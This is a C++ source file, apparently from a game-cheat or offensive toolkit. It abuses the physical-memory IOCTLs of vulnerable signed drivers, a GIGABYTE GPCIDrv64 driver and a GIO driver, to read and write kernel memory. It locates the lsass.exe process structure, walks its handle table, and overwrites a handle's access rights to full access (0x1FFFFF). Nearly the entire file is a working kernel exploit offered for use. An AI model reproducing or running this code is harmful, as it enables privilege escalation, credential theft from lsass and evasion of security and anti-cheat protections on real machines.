// HandleElevationDriver.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include "CheatHelper.h"
#include "DriverHelper.h"
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <cstdint>



// Definition of IOCTL numbers
// GPCIDrv64 Driver
#define IOCTL_MAPPHYSICAL	0x9C402580
#define IOCTL_UNMAPPHYSICAL	0x9C402584
// GIO Driver
#define IOCTL_GIO_MAPPHYSICAL	0xC3502004
#define IOCTL_GIO_UNMAPPHYSICAL 0xC3502008
#define IOCTL_GIO_MEMCPY 0xC3502808

// Kernel offsets
// W10
#define OFFSET_IMAGEFILENAME 0x450
#define OFFSET_OBJECTTABLE 0x418

#pragma comment(lib, "ntdll.lib")

// Structure of MAP
typedef struct _READ_REQUEST {
	DWORD InterfaceType;
	DWORD Bus;
	ULONG64 PhysicalAddress;
	DWORD IOSpace;
	DWORD size;
} READ_REQUEST;

typedef struct _WRITE_REQUEST {
	DWORDLONG address;
	DWORD length;
	DWORDLONG buffer;
} WRITE_REQUEST;

typedef struct _MEMCPY_REQUEST {
	ULONG64 dest;
	ULONG64 src;
	DWORD size;
} MEMCPY_REQUEST;


typedef struct _HANDLE_TABLE_ENTRY
{
	//This struct is incomplete, but we dont really care about the other fields
	ULONGLONG Value;
	ULONGLONG GrantedAccess : 25;
} HANDLE_TABLE_ENTRY, *PHANDLE_TABLE_ENTRY;

typedef struct _HANDLE_TABLE
{
	CHAR fill[100];
} HANDLE_TABLE, *PHANDLE_TABLE;


ULONG64 GIO_mapPhysical(ULONG64 physicaladdress, DWORD size)
{
	READ_REQUEST inbuffer = { 0, 0, physicaladdress, 0, size };
	ULONG64 outbuffer[2] = { 0 };
	DWORD bytes_returned = 0;
	DeviceIoControl(DriverHelper::hDeviceDrv,
		IOCTL_GIO_MAPPHYSICAL,
		&inbuffer,
		sizeof(inbuffer),
		&outbuffer,
		sizeof(outbuffer),
		&bytes_returned,
		(LPOVERLAPPED)NULL);

	return outbuffer[0];
}

ULONG64 GIO_unmapPhysical(ULONG64 address)
{
	ULONG64 inbuffer = address;
	ULONG64 outbuffer[2] = { 0 };
	DWORD bytes_returned = 0;
	DeviceIoControl(DriverHelper::hDeviceDrv,
		IOCTL_GIO_UNMAPPHYSICAL,
		(LPVOID)&inbuffer,
		sizeof(inbuffer),
		(LPVOID)outbuffer,
		sizeof(outbuffer),
		&bytes_returned,
		(LPOVERLAPPED)NULL);

	return outbuffer[0];
}

BOOL GIO_memcpy(ULONG64 dest, ULONG64 src, DWORD size)
{
	MEMCPY_REQUEST mystructIn = { dest, src, size };
	BYTE outbuffer[0x30] = { 0 };
	DWORD returned = 0;

	DeviceIoControl(DriverHelper::hDeviceDrv, IOCTL_GIO_MEMCPY, (LPVOID)&mystructIn, sizeof(mystructIn), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);
	if (returned) {
		return TRUE;
	}
	return FALSE;
}



ULONG64 GPCI_mapPhysical(DWORDLONG physicaladdress, DWORD size)
{
	READ_REQUEST inbuffer = { physicaladdress, size };
	ULONG64 outbuffer[2] = {0};
	DWORD bytes_returned = 0;
	DeviceIoControl(DriverHelper::hDeviceDrv,
		IOCTL_MAPPHYSICAL,				
		&inbuffer,             
		sizeof(inbuffer),      
		&outbuffer,            
		sizeof(outbuffer),
		&bytes_returned,           
		(LPOVERLAPPED)NULL);

	return outbuffer[0];
}

ULONG64 GPCI_unmapPhysical(ULONG64 address)
{
	ULONG64 inbuffer = address;
	ULONG64 outbuffer[2] = { 0 };
	DWORD bytes_returned = 0;

	DeviceIoControl(DriverHelper::hDeviceDrv,
		IOCTL_UNMAPPHYSICAL,
		(LPVOID)&inbuffer,
		sizeof(inbuffer),
		(LPVOID)outbuffer,
		sizeof(outbuffer),
		&bytes_returned, 
		(LPOVERLAPPED)NULL);
	
	return outbuffer[0];
}

_EPROCESS_PATTERN pivotProcess = { "lsass.exe", 0x2 };
PBYTE ppivotProcess = NULL;


int main()
{
	std::cout << "[+] Init" << std::endl;
	CheatHelper::loadConfig();


	// Connecting the vulnerable driver (GPCIDrv64.sys AORUS GRAPHICS ENGINE v1.25)
	std::cout << "[+] Obtaining HANDLE to Drv" << std::endl;
	if (DriverHelper::getDeviceHandle(CheatHelper::driverName))
	{
		return 1;
	}

	// If we want to change the driver, we just need to create our functions for communication and set the following variables
	DriverHelper::fn_memcpy = (_fn_memcpy)GIO_memcpy;
	DriverHelper::fn_mapPhysical = (_fn_mapPhysical)GIO_mapPhysical;
	DriverHelper::fn_unmapPhysical = (_fn_unmapPhysical)GIO_unmapPhysical;

	DWORDLONG stopAddress = _UI64_MAX;
	DWORD     searchSpace = 0x00001000;
	
	PBYTE ppivotProcess = (PBYTE)malloc(sizeof(_EPROCESS_PATTERN));
	memcpy(ppivotProcess, &pivotProcess, sizeof(_EPROCESS_PATTERN));


	ULONG64 objectTable = DriverHelper::findPhisical_ObjectTable(CheatHelper::startAddressPhy, stopAddress, searchSpace, ppivotProcess, sizeof(_EPROCESS_PATTERN));
	Sleep(1000);
	void** pObjectTable = (void**)objectTable;

	PBYTE pHandleTable = (PBYTE)malloc(sizeof(_HANDLE_TABLE));
	DriverHelper::fn_memcpy((ULONG64)pHandleTable, (ULONG64)*pObjectTable, sizeof(_HANDLE_TABLE));

	ULONG64 entryAddr = (ULONG64)malloc(sizeof(_HANDLE_TABLE_ENTRY));

	//TODO: add offsets and test in W7
	entryAddr = DriverHelper::ExpLookupHandleTableEntryW10((ULONGLONG)pHandleTable, (ULONGLONG)CheatHelper::requestHandleDrv);

	HANDLE_TABLE_ENTRY entry;
	DriverHelper::fn_memcpy((ULONG64)&entry, entryAddr, sizeof(_HANDLE_TABLE_ENTRY));
	
	Sleep(1000);
	std::cout << "[+] GrantedAccess original: " << std::hex << entry.GrantedAccess << std::endl;
	entry.GrantedAccess = 0x1FFFFF;
	
	DriverHelper::fn_memcpy(entryAddr + sizeof(ULONGLONG), (ULONG64)&entry + sizeof(ULONGLONG), sizeof(_HANDLE_TABLE_ENTRY) - sizeof(+sizeof(ULONGLONG)));
	std::cout << "[+] GrantedAccess overwritten" << std::endl;
	return 0;

}